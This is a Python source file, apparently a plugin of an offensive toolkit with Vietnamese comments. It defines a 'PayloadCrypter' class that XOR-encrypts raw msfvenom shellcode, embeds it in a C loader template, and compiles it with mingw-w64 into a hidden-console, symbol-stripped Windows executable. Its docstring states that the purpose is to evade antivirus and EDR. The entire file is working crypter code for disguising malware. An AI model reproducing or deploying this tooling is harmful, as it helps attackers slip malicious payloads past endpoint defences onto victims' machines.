import os
import secrets
import string
import subprocess
import logging
import tempfile

class PayloadCrypter:
    """Plugin bọc Shellcode vào C/C++ loader để lách AV/EDR."""
    
    def __init__(self):
        self.template_path = os.path.join(os.path.dirname(__file__), "loader_template.c")
    
    def generate_key(self, length=16):
        return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))

    def xor_encrypt(self, data, key):
        key_bytes = key.encode()
        encrypted = bytearray()
        for i in range(len(data)):
            encrypted.append(data[i] ^ key_bytes[i % len(key_bytes)])
        return encrypted
    
    def format_c_array(self, data):
        return ", ".join([f"0x{b:02x}" for b in data])

    def obfuscate_and_compile(self, raw_shellcode_path, output_exe_path):
        """Đọc raw shellcode từ msfvenom, XOR, chèn vào template C và compile."""
        if not os.path.exists(raw_shellcode_path) or not os.path.exists(self.template_path):
            logging.error(f"[-] Missing shellcode or template.")
            return False

        with open(raw_shellcode_path, "rb") as f:
            raw_shellcode = f.read()

        key = self.generate_key()
        encrypted_shellcode = self.xor_encrypt(raw_shellcode, key)
        c_array = self.format_c_array(encrypted_shellcode)

        with open(self.template_path, "r") as f:
            template = f.read()

        template = template.replace("%SHELLCODE%", c_array)
        template = template.replace("%KEY%", key)

        # [CRIT-01] Dùng tempfile.mkstemp() thay vì hardcoded /tmp/
        # Tránh symlink attack (CWE-377) và đảm bảo cleanup qua try/finally
        fd, temp_c_path = tempfile.mkstemp(suffix='.c', prefix='penl_loader_')
        try:
            with os.fdopen(fd, 'w') as f:
                f.write(template)

            # Compile bằng mingw-w64
            cmd = [
                "x86_64-w64-mingw32-gcc", temp_c_path,
                "-o", output_exe_path,
                "-mwindows", # Ẩn console
                "-s"         # Strip symbols
            ]
            
            logging.info("[*] Compiling stealth payload with mingw-w64...")
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            if result.returncode == 0 and os.path.exists(output_exe_path):
                logging.info(f"[+] Stealth payload compiled successfully: {output_exe_path}")
                return True
            else:
                logging.error(f"[-] Compilation failed: {result.stderr.decode()}")
                return False
        finally:
            # [HIGH-01] Guaranteed cleanup — even on exception
            if os.path.exists(temp_c_path):
                os.remove(temp_c_path)
